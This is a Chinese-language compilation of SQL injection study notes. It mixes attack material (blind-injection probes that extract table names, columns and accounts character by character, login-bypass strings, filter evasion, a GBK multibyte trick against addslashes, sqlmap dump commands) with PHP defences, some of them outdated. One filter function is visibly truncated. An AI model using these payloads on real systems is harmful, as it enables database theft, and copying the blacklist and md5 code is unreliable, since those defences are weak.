sql注入	端口	80

一、原理
<br>通过构建特殊的输入作为参数传入Web应用程序，执行SQL语句进而执行攻击者所要的操作，SQL注入就是利用表单输入，将自己的恶意数据传给服务器应用程序，利用应用程序的一些漏洞，来篡改sql语句，获取服务器权限的攻击。其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。

二、重点防范：参数与变量（攻击者会调整攻击的参数）
<br>1.猜数据库中的表名、列名（看返回内容判断正确）
例从SQLserver内置变量user下手。基础类型：nvarchar。
<br>2.利用AND和OR运算规则造成后台脚本逻辑性错误。
注：①在后台验证代码上，账号密码的查询是要同一条查询语句一起查询。若分开查询：先查账号再查密码则没戏。
②看密码是否加密，一旦被MD5等其他方式加密，则只能看第一种方法。否则没戏。
<br>3.防御方法：过滤关键词
先定义一个函数，再写要过滤的关键词，如select，“”，from等

三、SQL注入语句特征（主要靠猜下手！）
<br>1.判断是否有注入点。
<br>; and 1=1 and 1=2
<br>2.猜表名如：如admin adminuser user pass password常用表名等。
<br>and 0<>(select count(*) from *)
<br>and 0<>(select count(*) from admin) ---判断是否存在admin这张表
<br>3.猜帐号数目：如果遇到0< 返回正确页面， 1<返回错误页面，说明帐号数目就是1个。
<br>and 0<(select count(*) from admin)
<br>and 1<(select count(*) from admin)

<br>4.猜字段名称。
<br>and 1=(select count(*) from admin where len(*)>0)--
<br>and 1=(select count(*) from admin where len（用户字段名称name)>0)
<br>and 1=(select count(*) from admin where len（密码字段名称password)>0)

5.各个字段的长度。
<br>and 1=(select count(*) from admin where len(*)>0)
<br>and 1=(select count(*) from admin where len(name)>6) 错误
<br>and 1=(select count(*) from admin where len(name)>5) 正确 长度是6
and 1=(select count(*) from admin where len(name)=6) 正确

6.最后猜解字符。

and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位
<br>and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位
<br>就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了


以下为详细特征及实例：
# 服务器判断语句
select * from users where username = '$paramuser' and password = '$parampw';
# 参数如果被赋予如下的值
## $paramuser = ' or 1='1 
## $parampw = anything
select * from users where username = '' or 1='1' and password = 'anything';
### 结果就是，本条语句恒为真，就会窃取数据库用户信息。
### 所以很多情况下，服务器会将用户输入的数据进行过滤处理，比如or，and一些敏感字符串，空格。


1、先试试引号测试：
`输入param ： 1'`
select * from tables where id = '1'';
2、试试敏感词：
`输入param ：' or 1='1`
select * from tables where id = '' or 1='1';
经过测试,敏感词'and'被过滤了.
3、通过union关键词猜测表名
union就是联合查询，sql语句 union sql语句，就是执行两条sql语句的意思。我们通过union语句来构造自己的sql语句。
`输入param ：' union select 1 or ''='`
select * from tables where id = '' union select 1 or ''='';
>* 注意：最后的where ''=' 是为了消除原始语句的尾'
结果出错，我们思考，是不是空格被过滤了。我们使用，/**/来替代空格。
/**/是注释，再sql语句中会将其转化为空格，防止空格被过滤。
`输入param ：'/**/union/**/select/**/1/**/or/**/''='`
猜测表名
利用sqlmap爆表
获取网址管理员后台密码，获取数据库敏感信息

1.sqlmap -u "                "    查看操作系统信息（只要第一步全选y）
2.sqlmap -u "http://....?id=1"   --bds              爆库
3.sqlmap -u "                "   -D 库名 --tables   爆表
4.sqlmap -u "                "   -D 库名 -T 表名 --columns   爆列
5.sqlmap -u "                "   -D 库名 -T 表名 -T 列名 --dump    爆数据


sql绕过
通过特定参数绕过验证直接进入后台 
admin' and 1=1 #
xxxxx
或万能密码
'or'1'='1
'or'1'='1

虽然国内很多PHP程序员仍在依靠addslashes防止SQL注入，还是建议大家加强中文防止SQL注入的检查。addslashes的问题在于黑客可以用0xbf27来代替单引号，而addslashes只是将0xbf27修改为0xbf5c27，成为一个有效的多字节字符，其中的0xbf5c仍会被看作是单引号，所以addslashes无法成功拦截。
    当然addslashes也不是毫无用处，它是用于单字节字符串的处理，多字节字符还是用mysql_real_escape_string吧。
    另外对于php手册中get_magic_quotes_gpc的举例：
if (!get_magic_quotes_gpc()) {
$lastname = addslashes($_POST[‘lastname’]);
} else {
$lastname = $_POST[‘lastname’];
}

最好对magic_quotes_gpc已经开放的情况下，还是对$_POST[’lastname’]进行检查一下。
再说下mysql_real_escape_string和mysql_escape_string这2个函数的区别：
mysql_real_escape_string 必须在(PHP 4 >= 4.3.0, PHP 5)的情况下才能使用。否则只能用 mysql_escape_string ，两者的区别是：mysql_real_escape_string 考虑到连接的
当前字符集，而mysql_escape_string 不考虑。
总结一下：
* addslashes() 是强行加\；
* mysql_real_escape_string()  会判断字符集，但是对PHP版本有要求；
* mysql_escape_string不考虑连接的当前字符集。
在PHP编码的时候，如果考虑到一些比较基本的安全问题，首先一点：
1. 初始化你的变量
为什么这么说呢？我们看下面的代码：
PHP代码   
  
<?php     
    if ($admin)     
    {     
    echo '登陆成功！';     
    include('admin.php');     
    }     
    else     
    {     
    echo '你不是管理员，无法进行管理！';     
    }     
    ?>
    好，我们看上面的代码好像是能正常运行，没有问题，那么加入我提交一个非法的参数过去呢，那么效果会如何呢？比如我们的这个页是http://daybook.diandian.com/login.php，那么我们提交：http://daybook.diandian.com/login.php?admin=1，呵呵，你想一些，我们是不是直接就是管理员了，直接进行管理。
     当然，可能我们不会犯这么简单错的错误，那么一些很隐秘的错误也可能导致这个问题，比如phpwind论坛有个漏洞，导致能够直接拿到管理员权限，就是因为有个$skin变量没有初始化，导致了后面一系列问题。那么我们如何避免上面的问题呢？首先，从php.ini入手，把php.ini里面的register_global =off，就是不是所有的注册变量为全局，那么就能避免了。但是，我们不是服务器管理员，只能从代码上改进了，那么我们如何改进上面的代码呢？我们改写如下：
PHP代码      
  
  <?php     
    $admin = 0; // 初始化变量     
    if ($_POST['admin_user'] && $_POST['admin_pass'])     
    {     
    // 判断提交的管理员用户名和密码是不是对的相应的处理代码     
    // ...     
    $admin = 1;     
    }     
    else     
    {     
    $admin = 0;     
    }     
    if ($admin)     
    {     
    echo '登陆成功！';     
    include('admin.php');     
    }     
    else     
    {     
    echo '你不是管理员，无法进行管理！';     
    }     
    ?>

    那么这时候你再提交http://daybook.diandian.com/login.php?admin=1就不好使了，因为我们在一开始就把变量初始化为 $admin = 0 了，那么你就无法通过这个漏洞获取管理员权限。
2. 防止SQL Injection (sql注射)
    SQL 注射应该是目前程序危害最大的了，包括最早从asp到php，基本上都是国内这两年流行的技术，基本原理就是通过对提交变量的不过滤形成注入点然后使恶意用户能够提交一些sql查询语句，导致重要数据被窃取、数据丢失或者损坏，或者被入侵到后台管理。
    那么我们既然了解了基本的注射入侵的方式，那么我们如何去防范呢？这个就应该我们从代码去入手了。
   我们知道Web上提交数据有两种方式，一种是get、一种是post，那么很多常见的sql注射就是从get方式入手的，而且注射的语句里面一定是包含一些sql语句的，因为没有sql语句，那么如何进行，sql语句有四大句：select 、update、delete、insert，那么我们如果在我们提交的数据中进行过滤是不是能够避免这些问题呢？
于是我们使用正则就构建如下函数：
PHP代码

   <?php          
    function inject_check($sql_str)     
    {     
    return eregi('select|insert|update|delete|'|     
    function verify_id($id=null)     
    {     
    if (!$id) { exit('没有提交参数！'); } // 是否为空判断     
    elseif (inject_check($id)) { exit('提交的参数非法！'); } // 注射判断     
    elseif (!is_numeric($id)) { exit('提交的参数非法！'); } // 数字判断     
    $id = intval($id); // 整型化         
    return $id;     
    }     
    ?>

     呵呵，那么我们就能够进行校验了，于是我们上面的程序代码就变成了下面的：
PHP代码     
   
 <?php     
    if (inject_check($_GET['id']))     
    {     
    exit('你提交的数据非法，请检查后重新提交！');     
    }     
    else     
    {     
    $id = verify_id($_GET['id']); // 这里引用了我们的过滤函数，对$id进行过滤     
    echo '提交的数据合法，请继续！';     
    }     
    ?>

    好，问题到这里似乎都解决了，但是我们有没有考虑过post提交的数据，大批量的数据呢？
比如一些字符可能会对数据库造成危害，比如 ' _ ', ' %'，这些字符都有特殊意义，那么我们如果进行控制呢？还有一点，就是当我们的php.ini里面的magic_quotes_gpc = off的时候，那么提交的不符合数据库规则的数据都是不会自动在前面加' '的，那么我们要控制这些问题，于是构建如下函数：
PHP代码      
  
  <?php        
    function str_check( $str )     
    {     
    if (!get_magic_quotes_gpc()) // 判断magic_quotes_gpc是否打开     
    {     
    $str = addslashes($str); // 进行过滤     
    }     
    $str = str_replace("_", "\_", $str); // 把 '_'过滤掉     
    $str = str_replace("%", "\%", $str); // 把' % '过滤掉     
         
    return $str;     
    }     
    ?>

    我们又一次的避免了服务器被沦陷的危险。
    最后，再考虑提交一些大批量数据的情况，比如发贴，或者写文章、新闻，我们需要一些函数来帮我们过滤和进行转换，再上面函数的基础上，我们构建如下函数：
PHP代码  
    

<?php      
    function post_check($post)     
    {     
    if (!get_magic_quotes_gpc()) // 判断magic_quotes_gpc是否为打开     
    {     
    $post = addslashes($post); // 进行magic_quotes_gpc没有打开的情况对提交数据的过滤     
    }     
    $post = str_replace("_", "\_", $post); // 把 '_'过滤掉     
    $post = str_replace("%", "\%", $post); // 把' % '过滤掉     
    $post = nl2br($post); // 回车转换     
    $post= htmlspecialchars($post); // html标记转换        
    return $post;     
    }     
    ?>

    呵呵，基本到这里，我们把一些情况都说了一遍，其实我觉得自己讲的东西还很少，至少我才只讲了两方面，再整个安全中是很少的内容了，考虑下一次讲更多，包括php安全配置，apache安全等等，让我们的安全正的是一个整体，作到最安全。
    最后在告诉你上面表达的：1. 初始化你的变量 2. 一定记得要过滤你的变量

一个是没有对输入的数据进行过滤（过滤输入），还有一个是没有对发送到数据库的数据进行转义（转义输出）。这两个重要的步骤缺一不可，需要同时加以特别关注以减少程序错误。
对于攻击者来说，进行SQL注入攻击需要思考和试验，对数据库方案进行有根有据的推理非常有必要（当然假设攻击者看不到你的源程序和数据库方案），考虑以下简单的登录表单：
复制代码代码如下:

<form action="/login.php" method="POST">
<p>Username: <input type="text" name="username" /></p>
<p>Password: <input type="password" name="password" /></p>
<p><input type="submit" value="Log In" /></p>
</form>

作为一个攻击者，他会从推测验证用户名和密码的查询语句开始。通过查看源文件，他就能开始猜测你的习惯。
比如命名习惯。通常会假设你表单中的字段名为与数据表中的字段名相同。当然，确保它们不同未必是一个可靠的安全措施。
第一次猜测，一般会使用下面例子中的查询：
复制代码代码如下:
<?php
 $password_hash = md5($_POST['password']);

$sql = "SELECT count(*)
      FROM   users
      WHERE  username = '{$_POST['username']}'
      AND    password = '$password_hash'";
 ?>

使用用户密码的MD5值原来是一个通行的做法，但现在并不是特别安全了。最近的研究表明MD5算法有缺陷，而且大量MD5数据库降低了MD5反向破解的难度。请访问http://md5.rednoize.com/ 查看演示（原文如此，山东大学教授王小云的研究表明可以很快的找到MD5的“碰撞”，就是可以产生相同的MD5值的不同两个文件和字串。MD5是信息摘要算法，而不是加密算法，反向破解也就无从谈起了。不过根据这个成果，在上面的特例中，直接使用md5是危险的。）。
最好的保护方法是在密码上附加一个你自己定义的字符串，例如：
复制代码代码如下:

<?php
 $salt = 'SHIFLETT';
$password_hash = md5($salt . md5($_POST['password'] . $salt));
 ?>

当然，攻击者未必在第一次就能猜中，他们常常还需要做一些试验。有一个比较好的试验方式是把单引号作为用户名录入，原因是这样可能会暴露一些重要信息。有很多开发人员在Mysql语句执行出错时会调用函数mysql_error()来报告错误。见下面的例子：
复制代码代码如下:

<?php
 mysql_query($sql) or exit(mysql_error());
 ?>

虽然该方法在开发中十分有用，但它能向攻击者暴露重要信息。如果攻击者把单引号做为用户名，mypass做为密码，查询语句就会变成：
复制代码代码如下:

<?php
 $sql = "SELECT *
      FROM   users
      WHERE  username = '''
      AND    password = 'a029d0df84eb5549c641e04a9ef389e5'";
 ?>

当该语句发送到MySQL后，系统就会显示如下错误信息：
复制代码代码如下:

You have an error in your SQL syntax. Check the manual that corresponds to your
MySQL server version for the right syntax to use near 'WHERE username = ''' AND
password = 'a029d0df84eb55

不费吹灰之力，攻击者已经知道了两个字段名(username和password)以及他们出现在查询中的顺序。除此以外，攻击者还知道了数据没有正确进行过滤（程序没有提示非法用户名）和转义（出现了数据库错误），同时整个WHERE条件的格式也暴露了，这样，攻击者就可以尝试操纵符合查询的记录了。
在这一点上，攻击者有很多选择。一是尝试填入一个特殊的用户名，以使查询无论用户名密码是否符合，都能得到匹配：
复制代码代码如下:

myuser' or 'foo' = 'foo' --

假定将mypass作为密码，整个查询就会变成：
复制代码代码如下:

<?php

$sql = "SELECT *
      FROM   users
      WHERE  username = 'myuser' or 'foo' = 'foo' --
      AND    password = 'a029d0df84eb5549c641e04a9ef389e5'";

?>

幸运的是，SQL注入是很容易避免的。正如前面所提及的，你必须坚持过滤输入和转义输出。
虽然两个步骤都不能省略，但只要实现其中的一个就能消除大多数的SQL注入风险。如果你只是过滤输入而没有转义输出，你很可能会遇到数据库错误（合法的数据也可能影响SQL查询的正确格式），但这也不可靠，合法的数据还可能改变SQL语句的行为。另一方面，如果你转义了输出，而没有过滤输入，就能保证数据不会影响SQL语句的格式，同时也防止了多种常见SQL注入攻击的方法。
当然，还是要坚持同时使用这两个步骤。过滤输入的方式完全取决于输入数据的类型（见第一章的示例），但转义用于向数据库发送的输出数据只要使用同一个函数即可。对于MySQL用户，可以使用函数mysql_real_escape_string( )：
复制代码代码如下:

<?php
 $clean = array();
$mysql = array();

$clean['last_name'] = "O'Reilly";
$mysql['last_name'] = mysql_real_escape_string($clean['last_name']);

$sql = "INSERT
      INTO   user (last_name)
      VALUES ('{$mysql['last_name']}')";
 ?>

尽量使用为你的数据库设计的转义函数。如果没有，使用函数addslashes()是最终的比较好的方法。
当所有用于建立一个SQL语句的数据被正确过滤和转义时，实际上也就避免了SQL注入的风险。如果你正在使用支持参数化查询语句和占位符的数据库操作类（如PEAR::DB, PDO等），你就会多得到一层保护。见下面的使用PEAR::DB的例子：
复制代码代码如下:

<?php
$sql = 'INSERT
      INTO   user (last_name)
      VALUES (?)';
$dbh->query($sql, array($clean['last_name']));
?>

